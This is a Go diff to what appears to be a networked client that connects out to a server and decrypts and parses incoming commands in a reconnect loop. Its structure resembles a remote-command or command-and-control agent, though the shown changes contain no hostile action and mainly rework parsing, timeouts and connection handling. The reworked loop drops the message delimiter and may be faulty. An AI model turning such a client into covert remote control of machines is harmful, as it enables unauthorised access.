@@ -45,7 +45,7 @@ var (
 	sessionId       string
 	logStream       *log.Logger
 	logEnabled      bool      = true
-	address         string    = "10.0.0.127"
+	address         string    = "127.0.0.1"
 	port            string    = "54678"
 	startTime       time.Time = time.Now().UTC()
 	exitProcess     bool      = false
@@ -606,10 +606,10 @@ func GetUptime() string {
 
 func ParseAction(action string) error {
 	action = strings.TrimSpace(action)
-	re := regexp.MustCompile(`(?:(?:"[^"]*")|(?:\S+))`)
-	parts := re.Split(action, -1)
+	re := regexp.MustCompile(`(?:(?:"(?:\\.|[^"\\])*")|(?:\S+))`)
+	parts := re.FindAllString(action, -1)
 	if len(parts) < 1 {
-		return fmt.Errorf("invalid action format")
+		return fmt.Errorf("command unrecognized")
 	}
 	command := parts[0]
 	properties := parts[1:]
@@ -669,48 +669,45 @@ func ParseAction(action string) error {
 }
 
 func HandleConnection(conn net.Conn) {
+	defer conn.Close() // Ensure the connection is closed when done
+
 	reader := bufio.NewReader(conn)
 	var buffer bytes.Buffer
 
 	for {
 		if exitProcess {
+			WriteLog("Exiting connection handler.")
 			return
 		}
 
 		// Set a read deadline to prevent blocking indefinitely
-		conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
+		conn.SetReadDeadline(time.Now().Add(10 * time.Second)) // Increased deadline for stability
 
 		chunk := make([]byte, 1024)
 		n, err := reader.Read(chunk)
-
 		if err != nil {
 			if err == io.EOF {
 				WriteLog("Connection closed by server")
 				return
-			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+			}
+			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
 				// This is just a timeout, not a real error
 				continue
-			} else {
-				WriteLog("Error reading from connection: %v", err)
-				return
 			}
+			WriteLog("Error reading from connection: %v", err)
+			return
 		}
 
 		if n > 0 {
+			WriteLog("Received data: %s", string(chunk[:n])) // Log received chunk for debugging
 			buffer.Write(chunk[:n])
 
 			for {
-				index := bytes.Index(buffer.Bytes(), []byte("--FIN--"))
-				if index == -1 {
-					break
-				}
-
-				data := buffer.Bytes()[:index]
-				buffer.Next(index + 6) // 6 is the length of "--FIN--"
-
+				// Extract the data
+				data := buffer.Bytes()
 				if len(data) > 0 {
-					WriteLog("Received Data: %s...", string(data)[:100])
 					action, err := DecryptData(string(data), sessionId)
+					WriteLog("Decrypted Data: %s", action)
 					if err != nil {
 						WriteLog("DecryptData error: %v", err)
 					} else if action != "" {
@@ -736,7 +733,7 @@ func ConnectToServer() {
 				continue
 			}
 			client = conn
-			WriteLog("Client %s connected.", CVER)
+			WriteLog("Client connected.")
 		}
 		mutex.Unlock()
 
@@ -756,34 +753,23 @@ func ConnectToServer() {
 
 		HandleConnection(client)
 
-		mutex.Lock()
-		if client != nil {
-			client.Close()
-			client = nil
-		}
-		mutex.Unlock()
-
 		if !exitProcess {
 			WriteLog("Connection lost. Attempting to reconnect...")
+			client = nil                // Reset client to trigger reconnection
 			time.Sleep(5 * time.Second) // Wait before reconnecting
+			continue
 		}
 	}
 	WriteLog("Connection to server closing.")
 }
 
 func main() {
-	var wg sync.WaitGroup
-	wg.Add(1)
-
 	err := InitLogging()
 	if err != nil {
 		log.Panicf("Logging error: %v", err)
 	}
 
-	go func() {
-		defer wg.Done()
-		ConnectToServer()
-	}()
+	go ConnectToServer()
 
 	// Set up a channel to listen for interrupt signals
 	sigChan := make(chan os.Signal, 1)
@@ -799,7 +785,4 @@ func main() {
 	if client != nil {
 		client.Close()
 	}
-
-	// Wait for the goroutine to finish
-	wg.Wait()
 }
